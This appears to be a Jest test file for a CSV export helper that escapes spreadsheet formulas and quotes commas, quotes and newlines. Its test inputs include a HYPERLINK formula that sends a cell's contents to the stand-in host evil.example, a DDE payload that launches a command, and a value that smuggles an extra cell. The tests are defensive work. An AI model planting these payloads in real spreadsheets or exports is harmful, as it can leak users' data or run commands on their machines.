import { csvCell, csvRow } from './csv.util';

describe('csvCell() - spreadsheet-safe CSV cells', () => {
  it.each([
    ['=HYPERLINK("https://evil.example/?d="&D2,"Click")', `"'=HYPERLINK(""https://evil.example/?d=""&D2,""Click"")"`],
    ["+cmd|' /C calc'!A0", `"'+cmd|' /C calc'!A0"`],
    ['-2+3', `"'-2+3"`],
    ['@SUM(A1:A9)', `"'@SUM(A1:A9)"`],
    ['\t=1+1', `"'\t=1+1"`],
    ['\r=1+1', `"'\r=1+1"`],
  ])('neutralizes the formula %j', (input, expected) => {
    expect(csvCell(input)).toBe(expected);
  });

  it('quotes commas, quotes and newlines so they cannot shift columns or add rows', () => {
    expect(csvCell('Doe, John')).toBe('"Doe, John"');
    expect(csvCell('say "hi"')).toBe('"say ""hi"""');
    expect(csvCell('line1\nline2')).toBe('"line1\nline2"');
    // an attacker-supplied value cannot end its own cell and start another
    expect(csvRow(['a', 'x","injected', 'b'])).toBe('"a","x"",""injected","b"');
  });

  it('leaves ordinary text and dates untouched apart from quoting', () => {
    expect(csvCell('Alice')).toBe('"Alice"');
    expect(csvCell('2026-10-29')).toBe('"2026-10-29"');
    expect(csvCell('—')).toBe('"—"');
  });

  it('writes null/undefined as an empty cell', () => {
    expect(csvCell(null)).toBe('""');
    expect(csvCell(undefined)).toBe('""');
  });

  it('keeps numbers numeric, including negative amounts', () => {
    expect(csvCell(1500)).toBe('1500');
    expect(csvCell(-250.5)).toBe('-250.5');
    expect(csvCell(0)).toBe('0');
  });

  it('csvRow joins cells with commas', () => {
    expect(csvRow(['2026-10-29', 'Alice', 1500])).toBe('"2026-10-29","Alice",1500');
  });
});
